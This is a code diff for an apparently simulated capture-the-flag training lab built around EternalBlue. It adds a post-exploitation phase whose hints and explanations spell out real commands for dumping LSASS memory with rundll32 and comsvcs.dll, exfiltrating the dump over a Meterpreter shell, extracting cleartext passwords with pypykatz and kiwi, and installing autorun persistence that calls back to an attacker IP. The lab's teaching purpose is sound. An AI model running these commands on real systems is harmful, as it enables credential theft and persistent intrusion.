@@ -67,15 +67,73 @@ const ETERNALBLUE_CHALLENGES = [
   },
 ];
 
+// Post-exploitation phase — unlocks once Phase 1 is fully completed.
+// Same shape and formatting as ETERNALBLUE_CHALLENGES so the drawer renders identically.
+const ETERNALBLUE_POSTEX_CHALLENGES = [
+  {
+    id: 1, title: 'Find the lsass PID', pts: 150,
+    flag: 'FLAG{lsass_pid_located}',
+    hint: 'shell\ntasklist | findstr lsass',
+    explain: 'Time to graduate from one box to a whole network. The plan: dump the memory of lsass.exe (the process that holds every logged-on user\'s plaintext password and NTLM hash), exfil the dump, parse it on our box.\n\nFirst we need lsass\'s PID. Drop into cmd.exe with shell, then ask Windows for the process list and grep for it. The number in the second column is what we feed the next step.',
+    done: false,
+    check: r => r.id === 'win-tasklist-lsass',
+  },
+  {
+    id: 2, title: 'Dump LSASS (LOLBAS)', pts: 350,
+    flag: 'FLAG{lsass_minidump_written}',
+    hint: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 460 C:\\Windows\\Temp\\lsass.dmp full',
+    explain: 'comsvcs.dll ships with every Windows install since 2000. Its MiniDump export does exactly what mimikatz wants — and nothing on disk is ours. This is the textbook "Living Off the Land" technique: Microsoft\'s own signed code, doing something Microsoft very much doesn\'t want you doing.\n\nrundll32 calls the export, passes lsass\'s PID and an output path, and exits silent on success. The dump (~47 MB) is now sitting in C:\\Windows\\Temp.',
+    done: false,
+    check: r => r.id === 'win-lsass-dump',
+  },
+  {
+    id: 3, title: 'Exfiltrate the dump', pts: 200,
+    flag: 'FLAG{lsass_dump_exfiltrated}',
+    hint: 'exit\ndownload C:\\Windows\\Temp\\lsass.dmp /tmp/lsass.dmp',
+    explain: 'exit drops you back to the meterpreter prompt — download is a Meterpreter built-in, not a cmd.exe command, so the shell has to be closed first.\n\nThe transfer streams the 47 MB minidump back over the existing reverse-shell channel. On a LAN it takes a few seconds; over the internet, minutes. Once it\'s on your box, you can parse it offline with no AV in the way.',
+    done: false,
+    check: r => r.id === 'msf-download-lsass',
+  },
+  {
+    id: 4, title: 'Parse with pypykatz', pts: 300,
+    flag: 'FLAG{plaintext_creds_extracted}',
+    hint: 'pypykatz lsa minidump /tmp/lsass.dmp',
+    explain: 'pypykatz is the Python rewrite of mimikatz — runs anywhere, doesn\'t need Windows. It walks LSASS\'s heap inside the dump, finds the LogonSessionList, and decrypts every credential in place using LSASS\'s own key material.\n\nThe juicy lines are under == WDIGEST == — those are cleartext passwords. You\'re looking at every account that had a session on that box, in plain text.',
+    done: false,
+    check: r => r.id === 'pypykatz',
+  },
+  {
+    id: 5, title: 'Install persistence', pts: 350,
+    flag: 'FLAG{persistence_installed}',
+    hint: 'run persistence -X -i 30 -p 4444 -r 10.10.10.5',
+    explain: 'A reverse shell only lives as long as the meterpreter process. Reboot the box and you\'re out. Persistence fixes that.\n\nrun persistence drops a tiny VBS payload to disk and registers it as an autorun under HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Every time the box boots, it phones home to your handler. The flags: -X autorun on boot, -i 30 second retry interval, -p 4444 the port, -r 10.10.10.5 your IP.\n\nIt\'s loud — autoruns are the first place any IR analyst looks. Modern operators use scheduled tasks, WMI subscriptions, or service hijacking instead. But this is the textbook starting point.',
+    done: false,
+    check: r => r.id === 'msf-persistence',
+  },
+  {
+    id: 6, title: 'creds_all (the iconic dump)', pts: 400,
+    flag: 'FLAG{kiwi_creds_all_complete}',
+    hint: 'load kiwi\ncreds_all',
+    explain: 'load kiwi reflectively maps mimikatz into the meterpreter process — same engine Benjamin Delpy wrote in 2011, wrapped as a Metasploit extension. No file ever touches the target\'s disk.\n\ncreds_all is the one-shot — it walks LSASS in place, decrypts every credential block (msv hashes, wdigest plaintext, tspkg, kerberos), and streams them back. Faster and louder than the procdump+pypykatz route, but you\'re already this deep.\n\nThe Administrator password printed in cleartext is your pivot to the rest of the network.',
+    done: false,
+    check: r => r.id === 'msf-kiwi-creds-all',
+  },
+];
+
 const CTF = {
   _lab: 'eternalblue',
+  _phase: 0,
   _labs: {
-    eternalblue: ETERNALBLUE_CHALLENGES,
+    // Each lab is an array of phases; finishing a phase scrolls the drawer
+    // off and replaces it with the next phase's challenges.
+    eternalblue: [ETERNALBLUE_CHALLENGES, ETERNALBLUE_POSTEX_CHALLENGES],
   },
 
-  get challenges() { return this._labs[this._lab]; },
+  get challenges() { return this._labs[this._lab][this._phase]; },
+  get phaseCount() { return this._labs[this._lab].length; },
 
   _loadState() {
+    // Phase progress isn't persisted — every session starts fresh at phase 0.
     try {
       const s = JSON.parse(localStorage.getItem('ctf_state_' + this._lab) || '{}');
       this.challenges.forEach(c => { if (s[c.id]) c.done = true; });
@@ -106,16 +164,74 @@ const CTF = {
       if (!c.done && c.check(result)) {
         c.done = true;
         this._saveState();
+        // If this completes the current phase and there's a next one,
+        // schedule the drawer transition (after the user has had a
+        // moment to read the flag-capture line).
+        if (this.doneCount() === this.challenges.length && this._phase + 1 < this.phaseCount) {
+          this._scheduleNextPhase();
+        }
         return c;
       }
     }
     return null;
   },
 
+  // Auto-advance after final challenge of current phase: brief beat so the
+  // ✓ registers, then slide.
+  _scheduleNextPhase() {
+    if (this._transitioning) return;
+    setTimeout(() => this._goToPhase(this._phase + 1, { direction: 'forward' }), 700);
+  },
+
+  // Slide the list off-screen, swap to targetIdx, slide back in.
+  // direction='forward' leaves right / enters from left; 'back' leaves left / enters from right.
+  _goToPhase(targetIdx, opts = {}) {
+    if (this._transitioning) return;
+    if (targetIdx < 0 || targetIdx >= this.phaseCount) return;
+    if (targetIdx === this._phase) return;
+    const direction = opts.direction || (targetIdx > this._phase ? 'forward' : 'back');
+    const list = document.getElementById('ctf-list');
+    const sidebar = document.getElementById('ctf-sidebar');
+    if (!list) {
+      this._phase = targetIdx;
+      this._renderSidebar();
+      return;
+    }
+    this._transitioning = true;
+    const leaveCls   = direction === 'forward' ? 'phase-leaving'  : 'phase-leaving-back';
+    const enterCls   = direction === 'forward' ? 'phase-entering' : 'phase-entering-back';
+    list.classList.add(leaveCls);
+    setTimeout(() => {
+      this._phase = targetIdx;
+      // Don't wipe done state when stepping manually — only on auto-advance forward.
+      if (opts.direction === 'forward') {
+        this.challenges.forEach(c => c.done = false);
+        localStorage.removeItem('ctf_state_' + this._lab);
+      }
+      this._renderSidebar();
+      list.classList.remove(leaveCls);
+      list.classList.add(enterCls);
+      // Force layout flush so the entering->resting transition runs.
+      // eslint-disable-next-line no-unused-expressions
+      list.offsetHeight;
+      requestAnimationFrame(() => {
+        list.classList.remove(enterCls);
+        this._transitioning = false;
+      });
+      if (sidebar && sidebar.classList.contains('collapsed')) {
+        sidebar.classList.remove('collapsed');
+      }
+    }, 380);
+  },
+
   reset() {
-    this.challenges.forEach(c => c.done = false);
+    this._phase = 0;
+    this._transitioning = false;
+    this._labs[this._lab].forEach(phase => phase.forEach(c => c.done = false));
     localStorage.removeItem('ctf_state_' + this._lab);
     this._resetLabState();
+    const list = document.getElementById('ctf-list');
+    if (list) list.classList.remove('phase-leaving', 'phase-entering', 'phase-leaving-back', 'phase-entering-back');
     this._renderSidebar();
   },
 
@@ -162,6 +278,14 @@ const CTF = {
     const pct = Math.round(this.score() / this.maxScore() * 100);
     barEl.style.width = pct + '%';
     progEl.textContent = `${this.doneCount()} / ${this.challenges.length} completed`;
+
+    // Phase nav state
+    const phaseLabel = document.getElementById('ctf-phase-label');
+    const prevBtn    = document.getElementById('ctf-phase-prev');
+    const nextBtn    = document.getElementById('ctf-phase-next');
+    if (phaseLabel) phaseLabel.textContent = `Phase ${this._phase + 1}/${this.phaseCount}`;
+    if (prevBtn) prevBtn.disabled = this._phase === 0;
+    if (nextBtn) nextBtn.disabled = this._phase >= this.phaseCount - 1;
 
     list.innerHTML = this.challenges.map(c => `
       <div class="ctf-item${c.done ? ' done' : ''}" data-cid="${c.id}" style="cursor:pointer">
@@ -254,7 +378,9 @@ const CTF = {
 
   init() {
     // Always start fresh — reset progress on every new session
-    this.challenges.forEach(c => c.done = false);
+    this._phase = 0;
+    this._transitioning = false;
+    this._labs[this._lab].forEach(phase => phase.forEach(c => c.done = false));
     localStorage.removeItem('ctf_state_eternalblue');
     this._renderSidebar();
 
@@ -275,6 +401,13 @@ const CTF = {
 
     document.getElementById('ctf-close-btn')?.addEventListener('click', () => {
       document.getElementById('ctf-sidebar').classList.add('collapsed');
+    });
+
+    document.getElementById('ctf-phase-prev')?.addEventListener('click', () => {
+      this._goToPhase(this._phase - 1);
+    });
+    document.getElementById('ctf-phase-next')?.addEventListener('click', () => {
+      this._goToPhase(this._phase + 1);
     });
   },
 };
